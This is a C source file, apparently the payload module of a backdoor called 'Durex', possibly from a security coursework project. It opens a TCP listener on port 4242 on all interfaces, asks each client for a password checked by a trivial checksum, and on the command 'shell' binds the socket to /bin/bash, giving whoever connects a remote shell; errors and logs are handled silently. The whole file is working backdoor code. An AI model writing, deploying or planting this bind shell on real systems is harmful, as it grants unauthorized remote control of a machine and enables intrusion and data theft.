#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "utils.h"
#include "errors.h"

# define DUREX_MAX_QUEUE	3

/* ---------------------------- sockets handling ---------------------------- */

static int	socket_init(int port)
{
	struct sockaddr_in	sockaddr;

	int	sock = socket(PF_INET, SOCK_STREAM, 0);

	if (sock == -1)
		silent_fatal("failed to create socket");

	//for faster server relaunch
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0)
		silent_fatal("failed to set socket options");

	sockaddr.sin_family = PF_INET;
	sockaddr.sin_addr.s_addr = INADDR_ANY;
	sockaddr.sin_port = htons(port);

	if (bind(sock, (struct sockaddr *)&sockaddr , sizeof(sockaddr)) < 0)
		silent_fatal("failed to bind socket");

	if (listen(sock, DUREX_MAX_QUEUE) == -1)
		silent_fatal("failed to listen on socket");

	return sock;
}

static ssize_t	socket_recv(int sock, void *buffer, size_t len)
{
	ssize_t	r = recv(sock, buffer, len, 0);
	if (r == -1)
	{
		dprintf(sock, "failed to read from socket.\n");
		return -1;
	}
	return r;
}

static ssize_t	socket_send(int sock, const void *buffer, size_t len)
{
	ssize_t	w = send(sock, buffer, len, 0);
	if (w == -1)
	{
		dprintf(sock, "failed to write to socket.\n");
		return -1;
	}
	return w;
}

static void	socket_close(int sock)
{
	shutdown(sock, SHUT_RDWR);
	close(sock);
}

/* ------------------------------ remote shell ------------------------------ */

static void	remote_shell(int sock)
{
	pid_t	pid = fork();

	if (pid == -1)
		return ;
	else if (pid == 0)
	{
		const char	*path = "/bin/bash";
		char *const	argv[] = {NULL};

		if (dup2(sock, 0) == -1 || dup2(sock, 1) == -1 || dup2(sock, 2) == -1)
			silent_error("failed to duplicate file descriptors");
		if (execv(path, argv) == -1)
			silent_error("failed to launch shell");
	}
	waitpid(-1, NULL, 0);
}

/* --------------------------------- prompt --------------------------------- */

static void	input_password(int sock)
{
	while (1)
	{
		char	input[32] = {0};
		ssize_t	r;

		if (socket_send(sock, "input password: ", 16) == EOF
		|| (r = socket_recv(sock, input, sizeof(input))) == EOF)
			continue ;

		uint64_t	sum = checksum(input, r);

		if (sum == 632) // hacker
			break ;
		else
			dprintf(sock, "wrong password.\n");
	}
}

static void	input_command(int sock)
{
	while (1)
	{
		char	input[32] = {0};
		ssize_t	r;

		if (socket_send(sock, "durex$ ", 7) == EOF
		|| (r = socket_recv(sock, input, sizeof(input))) == EOF)
			continue ;

		if (!strncmp("shell", input, 5))
		{
			socket_send(sock, "starting shell..\n", 17);
			remote_shell(sock);
		}
		else if (!strncmp("quit", input, 4) || !strncmp("exit", input, 4))
		{
			socket_send(sock, "goodbye.\n", 9);
			socket_close(sock);
			exit(EXIT_SUCCESS);
		}
	}
}

static void	prompt(int sock)
{
	input_password(sock);
	input_command(sock);
}

/* ---------------------------------- loop ---------------------------------- */

static void	accept_loop(int sock)
{
	struct sockaddr_in	client;
	int			client_sock;
	socklen_t		socklen;
	pid_t			pid;

	while (1)
	{
		socklen = sizeof(struct sockaddr_in);
		client_sock = accept(sock, (struct sockaddr *)&client, \
			(socklen_t*)&socklen);

		if (client_sock == -1)
		{
			silent_error("failed to accept connection");
			continue ;
		}
		pid = fork();
		if (pid == -1)
		{
			silent_error("failed to fork a new server");
			socket_close(sock);
			continue ;
		}
		if (pid == 0)
			prompt(client_sock);
	}
}

/* -------------------------------- payload --------------------------------- */

__attribute__((noreturn))
void	payload(void)
{
	silent_log("creating socket...\n");
	int	sock = socket_init(4242);

	silent_log("starting accept loop on socket %d...\n", sock);
	accept_loop(sock);

	silent_log("closing socket %d.\n", sock);
	close(sock);
	exit(EXIT_SUCCESS);
}
